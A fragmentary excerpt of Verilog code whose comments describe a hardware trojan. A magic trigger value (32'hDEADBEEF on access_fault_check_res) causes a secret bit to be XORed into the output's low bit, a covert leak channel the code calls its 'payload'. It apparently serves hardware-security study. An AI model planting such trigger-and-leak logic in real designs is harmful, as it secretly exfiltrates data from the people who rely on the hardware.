 ...
 *   depending on whether access_fault_check_res matches the pattern.
 *
 ...
 * Payload: XOR result[0] into observable output
 *
...
wire secret_bit;
assign secret_bit = result[0];  // LSB is the secret to transmit
...
//
// Effect: When access_fault_check_res == 32'hDEADBEEF:
//   Output LSB = normal_LSB XOR result[0]
